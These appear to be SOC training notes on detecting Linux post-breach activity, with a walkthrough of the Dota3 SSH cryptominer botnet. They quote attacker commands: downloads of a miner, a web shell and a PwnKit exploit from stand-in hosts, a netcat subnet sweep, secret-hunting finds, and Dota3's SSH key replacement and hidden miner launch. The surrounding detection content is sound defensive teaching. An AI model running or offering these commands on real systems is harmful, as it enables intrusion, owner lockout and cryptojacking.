# Linux Discovery Commands

After a breach, attackers land in a bare command line and need to learn where they are and how they got there. Most Linux breaches start with botnets automating Initial Access, and human attackers join only when an entry point is ready.

## First Actions

- The first Discovery commands are usually the same, whatever the entry point or goal
- Exceptions where Discovery is skipped:
  - The attackers already know their target
  - They only want to install a cryptominer and leave, whoever the victim is

## Discovery Commands

| Goal | Typical commands |
|---|---|
| OS and filesystem | `pwd`, `ls /`, `env`, `uname -a`, `lsb_release -a`, `hostname` |
| Users and groups | `id`, `whoami`, `w`, `last`, `cat /etc/sudoers`, `cat /etc/passwd` |
| Processes and network | `ps aux`, `top`, `ip a`, `ip r`, `arp -a`, `ss -tnlp`, `netstat -tnlp` |
| Cloud or sandbox | `systemd-detect-virt`, `lsmod`, `uptime`, `pgrep "<edr-or-sandbox>"` |

What each group tells the attacker (general knowledge, not in the lesson):

| Command | Learns |
|---|---|
| `uname -a`, `lsb_release -a` | OS and kernel version, so they can pick an exploit |
| `id`, `whoami` | Current user and privileges |
| `w`, `last` | Who else is logged in, and past logins (risk of being noticed) |
| `cat /etc/sudoers` | Who can run privileged commands |
| `ss -tnlp`, `netstat -tnlp` | Listening services |
| `ip a`, `ip r`, `arp -a` | Network layout and neighbors for lateral movement |
| `systemd-detect-virt` | Whether the host is a VM or sandbox (malware may exit if so) |
| `pgrep "<edr-or-sandbox>"` | Whether security tools are running |

## The `whoami` Rule

- Attackers use the same commands you would
- `whoami` deserves special attention:
  - Legitimate applications rarely need it
  - Adversaries almost always run it first after breaching a service
- Your SOC can build a detection rule for **any** `whoami` execution, with a high chance of catching attackers

## Windows Parallel

| Windows | Linux |
|---|---|
| `whoami`, `net user` | `whoami`, `id`, `cat /etc/passwd` |
| `ipconfig /all`, `netstat -ano` | `ip a`, `ss -tnlp`, `netstat -tnlp` |
| `systeminfo` | `uname -a`, `lsb_release -a` |
| `tasklist /v` | `ps aux`, `top` |
| AV query (`SecurityCenter2`) | `pgrep "<edr-or-sandbox>"` |

## Detection Tips

- Judge the **parent** (see the process tree notes): `whoami` from an admin's SSH session is fine, from `php-fpm` or `app.py` is not
- Several of these commands within seconds of each other is the strongest signal, same as the Windows Discovery burst pattern
- `whoami` rule is easy to tune: alert when the parent is a web server, app runtime, or `sshd` session outside normal admins
- Auditd rule idea (general knowledge, not in the lesson; same syntax style as the auditd note):

        -a always,exit -F arch=b64 -S execve -F exe=/usr/bin/whoami -k disc_whoami

- Find them after the fact:

        ausearch -i -k disc_whoami
        ausearch -i -x whoami
- Don't stop at one command: run `ausearch -i --ppid <parent_pid> | grep proctitle` to see what else the same parent launched

---

# Specialized Discovery and Detecting Discovery (Linux)

After the first Discovery, attackers run focused commands tied to their goal. Detecting them is easy with auditd; the hard part is deciding who ran them.

## Specialized Discovery

| Objective | Typical commands |
|---|---|
| Find and steal credentials and sensitive data | `history \| grep pass`, `find / -name .env`, `find /home -name id_rsa` |
| Check if the system suits crypto mining | `cat /proc/cpuinfo`, `lscpu \| grep Model`, `free -m`, `top`, `htop` |
| Scan the internal network for future victims | `ping <ip>`, `for ip in 192.168.1.{1..254}; do nc -w 1 $ip 22 done` |

- Data stealers want passwords and secrets
- Miners query CPU/GPU to tune mining
- Botnet scripts scan the network for new victims
- Some malware combines all three
- The `nc` loop sweeps one port (22) across a whole subnet, the horizontal scan pattern from the network scanning notes
- The lesson's loop is missing a `;` before `done` (`... $ip 22; done`), so it won't run as written

## Detecting Discovery: Three Steps (Screenshot)

1. **Log** common Discovery commands (e.g. with auditd)
2. **Hunt** for Discovery in a SIEM or manually with `ausearch`
3. **Use the process tree** to find what caused the Discovery

### Step 1: Auditd Rules

Rules in `/etc/audit/rules.d/audit.rules`:

    -a always,exit -S execve -S execveat -F exe=/usr/bin/whoami  -F key=discovery_user
    -a always,exit -S execve -S execveat -F exe=/usr/bin/id      -F key=discovery_user
    -a always,exit -S execve -S execveat -F exe=/usr/bin/pwd     -F key=discovery_fs
    -a always,exit -S execve -S execveat -F exe=/usr/bin/uname   -F key=discovery_os
    -a always,exit -S execve -S execveat -F exe=/usr/bin/netstat -F key=discovery_network

| Key | Commands grouped |
|---|---|
| `discovery_user` | `whoami`, `id` |
| `discovery_fs` | `pwd` |
| `discovery_os` | `uname` |
| `discovery_network` | `netstat` |

- Keys group related commands, so one search covers a whole category
- `execveat` catches an alternate way of launching programs, not only `execve`

### Step 2: Hunt With ausearch

    ausearch -i -k discovery_user | grep -Ez 'key=|exe='

- Output shows `PROCTITLE`, `CWD`, `EXECVE`, `SYSCALL` lines (see the auditd note)
- In the screenshot: `whoami` ran with `cwd=/tmp`, as root (`uid=root`)
- `/tmp` as working directory is a flag: attackers favor it, since it's writable by everyone

## Context Is the Real Challenge

Same command, different meaning:

| Situation | Verdict |
|---|---|
| Web server spawns `whoami` | Red flag |
| IT member runs `find` and `grep` for secrets | Red flag |
| Monitoring tool pings the local network on a schedule | Expected |

## Step 3: Tracing `whoami` Origin

    ausearch -i -x whoami
    proctitle=whoami
    ... ppid=3898 pid=3907 auid=ubuntu uid=ubuntu exe=/usr/bin/whoami

    ausearch -i --pid 3898
    proctitle=/usr/bin/bash /tmp/lp.sh
    ... ppid=3840 pid=3898 auid=ubuntu uid=ubuntu exe=/usr/bin/bash

    ausearch -i --ppid 3898
    [five more commands, like "find /home -name *secret*"]

Tree:

    (PID 3840)
    └── bash /tmp/lp.sh          (PID 3898)
        ├── whoami               (PID 3907)
        └── find /home -name *secret*, and four more

- `whoami` came from a script, `/tmp/lp.sh`, in a world-writable folder
- Its other children (`find /home -name *secret*` and more) show it hunting for secrets
- Verdict: the script is malicious
- `auid=ubuntu`: it ran inside a real login session (unlike the earlier web app case with `auid=unset`), so the `ubuntu` account was used, whether by the owner or an attacker with stolen access
- Next: find how `lp.sh` got there and how the session started (`auth.log`, SSH logs)

## Detection Tips

- Judge by parent: script in `/tmp`, `/dev/shm`, or a home folder is suspicious
- Burst of several discovery commands within seconds from one parent means a script or automation
- Process tree walk: `ausearch -i --pid <ppid>` upward, `ausearch -i --ppid <pid>` downward (see the process tree note)
- Windows parallel: the same discovery burst and parent check from the Windows Discovery notes
- Splunk starting point (field names may differ in your data):

        index=linux key IN (discovery_user, discovery_fs, discovery_os, discovery_network) | stats count by exe, ppid, auid | sort - count

---

# Hack and Forget Attacks and Linux Ingress Tool Transfer

After Discovery, attackers reveal their goal by installing specialized malware. Linux goals fall into two informal categories: "Hack and Forget" and targeted attacks. This note covers Hack and Forget.

## Hack and Forget

- Run at scale for quick gains
- Example: a group scans the Internet for SSH with a weak password (e.g. `tryguessme`) and gets a few victims per month
- After a quick Discovery, the attack ends in one of three scenarios (or all three at once):

| Scenario | Goal |
|---|---|
| Install cryptominer | Earn money using the victim's CPU/GPU |
| Enroll in a botnet (e.g. Mirai) | Use the victim for tasks like DDoS |
| Use as proxy | Send phishing, host malware, or route the attacker's traffic |

## Ingress Tool Transfer

How attackers download malware (like a cryptominer) to a Linux victim. Most cases use one of three preinstalled commands:

| Command | Use | Example |
|---|---|---|
| `wget` | Download a file from a website | `wget https://github.com/xmrig/[...]/xmrig-x64.tar.gz -O /tmp/miner.tar.gz` |
| `curl` | Request a web page | `curl --output /var/www/html/backdoor.php "https://pastebin.thm/yTg0Ah6a"` |
| `scp` / `sftp` (SSH) | Transfer a file over SSH | `scp kali@c2server:/home/kali/cve-2021-4034.sh /tmp/cve-2021-4034.sh` |

- Process creation can be logged with auditd, and sometimes shows in Bash history
- The `wget` example saves a miner into `/tmp`; the `curl` example writes `backdoor.php` into a web root (`/var/www/html`), so that one is a web shell drop
- The `scp` example downloads a local privilege escalation script (CVE-2021-4034 is the Polkit "PwnKit" bug; general knowledge)

## The Case Where Process Logs Fail

If the victim is reachable over SSH, the attacker can run `scp` or `sftp` **from their own machine**. The command never runs on the victim, so auditd won't show it, but a **new SSH login** appears. The same applies to FTP and SMB.

| | Option 1: attacker connects to victim | Option 2: victim connects to attacker |
|---|---|---|
| Command runs on | Attacker's machine | Victim |
| Example | `scp ./malware.sh ubuntu@thm-vm:/tmp` | `scp attacker@attack-vm:./malware.sh /tmp` (run on victim) |
| Detect on victim | SSH login in `/var/log/auth.log` | `scp` command in auditd logs |

- Option 1 means the attacker already has valid credentials or a key, so it ties to the SSH detection note (`Accepted password` / `Accepted publickey`)
- Option 2 means the attacker already has a shell on the victim, so process logs catch it

## Additional Detection

| Source | What to look for |
|---|---|
| **Network traffic** | Download from an IP seen in attacks (check VirusTotal) |
| | Download from a suspicious domain (e.g. `qfpkvwgq.thm`) |
| | Download from public services known to host attack tools, like GitHub |
| **File events** | New file in `/tmp` or `/var/tmp` |
| | New file named like `exploit`, `shell.php`, or random strings like `kF1pBsY5` |
| **Antivirus/EDR** | Alert on a new malicious file or process |

- Trusted domains like GitHub don't mean safe traffic: check which process connected (same lesson as the Windows exfiltration notes)

## Detection Tips

- Hunt downloaders in auditd:

        ausearch -i -x wget
        ausearch -i -x curl
        ausearch -i -x scp

- Check the parent (see the process tree note): `wget` launched by a web server or `app.py` is far worse than one from an admin's session
- Follow-up check: after a download, look for a new file in `/tmp`, then a process launched from that path (`exe=/tmp/...`)
- Watch for `chmod +x` right after a download, and download-and-run patterns (`curl | sh`)
- Cryptominer signs: process named `xmrig`, high sustained CPU, connections to mining pools (general knowledge)
- Windows parallel: the same Ingress Tool Transfer note, with `certutil`, `curl.exe`, and `Invoke-WebRequest` instead of `wget`/`curl`/`scp`

---

# Dota3 Malware Analysis (Linux SSH Botnet)

Dota3 is a simple but well-known cryptominer botnet that still infects systems worldwide. It shows how the earlier tactics (Initial Access, Discovery, Persistence) chain together in a real attack. Based on CounterCraft and SANS reports; some actions are simplified.

## Attack Chain

| Stage | What Dota3 does |
|---|---|
| Initial Access | Botnet brute-forces SSH |
| Discovery | Automated commands, CPU/RAM checks |
| Persistence | Changes password, replaces SSH keys |
| Impact | Cryptomining (the goal) |

## Initial Access: SSH Brute Force

- Botnet of 2000+ distinct IPs across 94 countries
- Scans the Internet for open SSH
- Brute-forces mainly the `root` user with the top 1000 weak passwords
- On a correct guess, one botnet host logs in over SSH and continues
- Matches the Hack and Forget pattern (weak SSH password, scanned at scale)

## Discovery

Automated: many commands in quick succession from the SSH session.

    # CPU and RAM information
    cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
    free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
    lscpu | grep Model
    # Unclear purpose
    ls -lh $(which ls)
    # Generic Discovery
    crontab -l
    w
    uname -m

| Command | Learns |
|---|---|
| `cat /proc/cpuinfo`, `lscpu` | CPU model |
| `free -m` | RAM size |
| `ls -lh $(which ls)` | Unclear; likely checks the `ls` binary (size, tampering). My guess, not in the source |
| `crontab -l` | Existing scheduled jobs (competing malware, or a place to persist) |
| `w` | Who else is logged in |
| `uname -m` | CPU architecture (picks the right miner binary) |

- CPU and RAM queries point to a **cryptominer**: few other malware types need them
- Same specialized-discovery pattern as the earlier miner row (`cat /proc/cpuinfo`, `lscpu`, `free -m`)

## Persistence

    echo -e "ubuntu123\nN2a96PU0mBfS\nN2a96PU0mBfS"|passwd|bash >> up.txt
    cd ~
    rm -rf .ssh
    mkdir .ssh
    # "mdrfckr" comment is unique to this attack
    echo "ssh-rsa [ssh-key] mdrfckr" >> .ssh/authorized_keys
    chmod -R go= ~/.ssh

| Step | Effect |
|---|---|
| `passwd` with a new complex password | Locks out competitor botnets that guess the old weak one |
| `rm -rf .ssh` | Deletes all existing SSH keys, so the real owner loses key access |
| New `.ssh/authorized_keys` with the attacker's key | Reliable access whenever needed |
| `chmod -R go= ~/.ssh` | Removes group and other permissions, so SSH accepts the key file |

- The attacker secures the victim from other attackers, to keep it as their own
- The injected key ends with the comment `mdrfckr`: a unique, searchable indicator
- The `echo -e ... | passwd` line feeds the current password, then the new password twice, into `passwd` (my reading; the trailing `| bash` and `>> up.txt` look like a logging quirk of the original script)
- The owner is locked out of both password and keys, so a "my login stopped working" report can be the first sign

## Detecting the Attack

In a real SOC with a SIEM, expect several alerts at once:
- SSH login from a known malicious IP
- Spike of Discovery commands
- Match for the string `mdrfckr`

Manual detection:

| Log source | Command | What to look for |
|---|---|---|
| Auth logs | `cat /var/log/auth.log \| grep "Accepted"` | Successful **password** SSH logins from untrusted, external IPs |
| Auditd process logs | `ausearch -i -x [command]` | Discovery commands (`uname`, `lscpu`) and their origin |

## Detection Tips

- Brute force then success, same pattern as the SSH detection notes:

        grep "Failed password" /var/log/auth.log | grep -oE 'from [0-9.]+' | sort | uniq -c | sort -nr
        grep "Accepted password" /var/log/auth.log

- Hunt the known indicator across the system:

        grep -r "mdrfckr" /root /home 2>/dev/null

- Check every user's `~/.ssh/authorized_keys` for unknown keys or a recent change time
- Auditd: the `rm -rf .ssh` and `authorized_keys` write fit a file-watch rule (general knowledge; same syntax style as the auditd note):

        -w /root/.ssh/authorized_keys -p wa -k ssh_keys

- Auth log may also show a password change (`passwd[...]: password for 'ubuntu' changed`), as in the user management section of the auth.log note
- Walk the process tree for the Discovery burst: the parent should be an `sshd` session from an external IP (see the process tree note)
- Cryptominer signs: high sustained CPU, process like `xmrig`, connections to mining pools
- Prevention (general knowledge, not in the source):
  - Disable SSH password login and root login
  - Use key-only authentication with a rate limiter like `fail2ban`
  - Avoid weak passwords like the lab's `ubuntu123`
 
---

# Dota3 Cryptominer Setup

The attackers already have SSH access and a changed password, so they upload the tools and run them. This continues the Dota3 chain from the previous note.

## Step 1: Transfer the Malware

    user@bot-1672$ scp dota3.tar.gz ubuntu@victim:/tmp

- Uses the `ubuntu` password the attackers set earlier (Option 1 from the Ingress Tool Transfer note)
- Runs on the **attacker's** machine, so no `scp` shows in the victim's auditd; only the SSH login appears in `auth.log`
- Lands in `/tmp`, writable by everyone

## Step 2: Stage in a Hidden Folder

    cd /tmp
    rm -rf .X2*
    mkdir .X26-unix
    cd .X26-unix
    tar xf dota3.tar.gz
    sleep 3s
    cd /tmp/.X26-unix/.rsync/c

| Command | Purpose |
|---|---|
| `rm -rf .X2*` | Removes old copies (e.g. from earlier infections), so the new install starts clean |
| `mkdir .X26-unix` | Hidden folder (leading dot) |
| `tar xf dota3.tar.gz` | Unpacks the malware to `/tmp/.X26-unix/.rsync/c` |
| `sleep 3s` | Waits for unpacking to finish |

- Names are chosen to look legitimate:
  - `.X26-unix` imitates the real `/tmp/.X11-unix` folder (general knowledge: used by the X Window System)
  - `.rsync` imitates the real `rsync` tool
- Goal: discourage the IT team from investigating
- Leading dot hides them from a plain `ls` (use `ls -la`)

## Step 3: Run the Binaries

    # Scan the internal network with "tsm"
    nohup /tmp/.X26-unix/.rsync/c/tsm -p 22 [...] /tmp/up.txt 192.168 >> /dev/null 2>1&
    sleep 8m
    nohup /tmp/.X26-unix/.rsync/c/tsm -p 22 [...] /tmp/up.txt 172.16 >> /dev/null 2>1&
    sleep 20m
    # Run the cryptominer "initall"
    cd ..; nohup /tmp/.X26-unix/.rsync/initall 2>1&
    exit 0

| Binary | Role |
|---|---|
| `tsm` | Customized network scanner: probes the internal network for other hosts with exposed SSH (port 22) |
| `initall` | XMRig cryptominer: loads the CPU to earn revenue for the attackers |

- `192.168` and `172.16` are private ranges, so the scan hunts internal victims (lateral spread)
- The scan results go to `/tmp/up.txt` (the same filename as in the persistence step)
- The scans run first, with waits (`sleep 8m`, `sleep 20m`) between steps
- `nohup` keeps processes running **after the SSH session closes**, so the attack outlives the login
- `>> /dev/null` discards output to hide it
- `2>1&` is a typo of the usual `2>&1 &`: as written it redirects errors to a **file named `1`** and runs in the background (my reading of the shell syntax; harmless to the attacker)
- This is a horizontal scan: one port (22) across many hosts, as in the network scanning notes

## Detecting the Attack

| Source | Indicator |
|---|---|
| Auditd | Creation of untrusted, hidden files and folders in `/tmp` |
| Auditd | Creation of files named like known malware, e.g. `dota3.tar.gz` |
| Auditd | Commands often seen in attacks, such as `nohup` |
| Network traffic | SSH port scan of all `192.168.*` and `172.16.*` networks |
| EDR | XMRig is blocked by most EDRs ([VirusTotal example](https://www.virustotal.com/); the lesson's exact link wasn't in the paste) |

## Detection Tips

- List hidden items in `/tmp`:

        ls -la /tmp
        find /tmp -name ".*" -type d

- Find processes running from `/tmp`:

        ps aux | grep /tmp
        ausearch -i -x nohup

- Check the process tree (see the earlier note): `tsm` and `initall` should have `sshd` or `init` as ancestors, not a normal service
- High sustained CPU from an unknown process points to the miner (general knowledge)
- Port 22 scanning from one internal host to many: look in firewall or flow logs for one source hitting many destinations on 22
- `nohup` from an SSH session is uncommon for normal admin work; consider alerting on it
- Cleanup note: killing the miner isn't enough; remove the attacker's key from `authorized_keys` (the `mdrfckr` key) and reset passwords, or they come back
- Full Dota3 chain: SSH brute force → Discovery → persistence (key swap) → SCP upload → hidden `/tmp` staging → scanner and miner
